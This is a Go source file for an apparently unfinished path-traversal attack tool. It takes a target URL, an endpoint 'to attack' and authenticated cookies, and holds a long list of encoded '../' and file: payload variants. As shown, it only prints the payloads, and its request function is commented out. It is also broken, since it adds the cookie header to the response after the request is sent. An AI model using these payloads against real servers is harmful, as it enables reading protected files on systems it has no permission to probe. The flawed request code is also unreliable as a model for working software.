package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

func sendRequests(url string, cookies string) {

	fmt.Println("[+] Sending request to: ", url)

	resp, err := http.Get(url)
	resp.Header.Add("Cookie", cookies)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(body))

}

func validateInput(url string, endpoint string) {
	if url == "" {
		fmt.Println("[-] URL not defined.. ")
		os.Exit(0)
	}

	if endpoint == "" {
		fmt.Println("[-] endpoint not defined.. ")
		os.Exit(0)
	}
}

func validateURLendPoints(url string, endPoint string) {
	if !strings.Contains(url, endPoint) {
		fmt.Println("[-] Endpoint not found in URL !")
		os.Exit(0)
	}
}

func validateURL(url string) {
	if !strings.Contains(url, "http://") && !strings.Contains(url, "https://") {
		fmt.Println("[-] Provide a correct schema http:// or https://")
		os.Exit(1)
	}

}

func main() {

	url := flag.String("url", "", "url from target")
	endPoint := flag.String("endpoint", "", "String in --url to attack. Ex: document.pdf")
	cookies := flag.String("cookies", "", "Cookies from authenticated path")
	goin := flag.Int("goin", 6, "max of recursive ../../../")
	flag.Parse()

	dotPatter := [...]string{"",
		"/..",
		"....//",
		"//....",
		"%252e%252e%255c",
		"%2e%2e%5c",
		"..%255c",
		"..%5c",
		"%5c../",
		"/%5c..",
		"..\\",
		"%2e%2e%2f",
		"../",
		"..%2f",
		"%2e%2e/",
		"%2e%2e%2f",
		"..%252f",
		"%252e%252e/",
		"%252e%252e%252f",
		"..%5c..%5c",
		"%2e%2e\\",
		"%2e%2e%5c",
		"%252e%252e\\",
		"%252e%252e%255c",
		"..%c0%af",
		"%c0%ae%c0%ae/",
		"%c0%ae%c0%ae%c0%af",
		"..%25c0%25af",
		"%25c0%25ae%25c0%25ae/",
		"%25c0%25ae%25c0%25ae%25c0%25af",
		"..%c1%9c",
		"%c0%ae%c0%ae\\",
		"%c0%ae%c0%ae%c1%9c",
		"..%25c1%259c",
		"%25c0%25ae%25c0%25ae\\",
		"%25c0%25ae%25c0%25ae%25c1%259c",
		"..%%32%66",
		"%%32%65%%32%65/",
		"%%32%65%%32%65%%32%66",
		"..%%35%63",
		"%%32%65%%32%65/",
		"%%32%65%%32%65%%35%63",
		"../",
		"...\\",
		"..../",
		"....\\",
		"........................................................................../",
		"..........................................................................\\",
		"..%u2215",
		"%uff0e%uff0e%u2215",
		"..%u2216",
		"..%uEFC8",
		"..%uF025",
		"%uff0e%uff0e\\",
		"%uff0e%uff0e%u2216",
	}

	invertedPattern := []string{"",
		"./",
		"/",
		"\\",
		"",
		".\\",
		"file:",
		"file:/",
		"file://",
		"file:///",
	}

	fmt.Println("URL: ", *url)
	fmt.Println("EndPoint: ", *endPoint)
	fmt.Println("Cookies: ", *cookies)
	fmt.Println("Goin: ", *goin)

	validateInput(*url, *endPoint)
	validateURL(*url)
	validateURLendPoints(*url, *endPoint)
	//sendRequests(*url, *cookies)

	for i, c := range dotPatter {
		fmt.Printf("%d) %s \n", i, c)
	}

	for i, c := range invertedPattern {
		fmt.Printf("%d) %s \n", i, c)
	}

}
